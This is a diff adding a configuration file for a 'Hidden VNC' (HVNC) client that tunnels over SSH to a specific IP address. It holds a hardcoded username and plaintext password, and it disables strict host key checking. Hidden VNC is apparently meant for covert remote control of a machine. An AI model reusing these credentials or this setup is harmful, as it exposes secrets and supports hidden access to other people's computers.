@@ -1,0 +1,43 @@
+# Hidden VNC Server Configuration
+# 
+# This file contains the default server configuration.
+# Modify these values to change the default connection settings.
+
+[server]
+# Default server host address
+host = "146.190.74.86"
+
+# SSH port (usually 22)
+ssh_port = 22
+
+# SSH username for tunnel connection
+username = "tunneluser"
+
+# SSH password (use with caution - consider SSH keys for production)
+password = "EuroFw19@a03ee"
+
+# HVNC server port (on remote host)
+hvnc_port = 5900
+
+# Local tunnel port (on client machine)
+tunnel_port = 3390
+
+[client]
+# Default client settings
+auto_connect = true
+fullscreen = false
+scale_factor = 1.0
+reconnect_attempts = 3
+connection_timeout = 30
+
+[security]
+# Security settings
+strict_host_key_checking = false
+server_alive_interval = 60
+server_alive_count_max = 3
+
+[advanced]
+# Advanced settings
+log_level = "info"
+frame_rate = 30
+jpeg_quality = 80
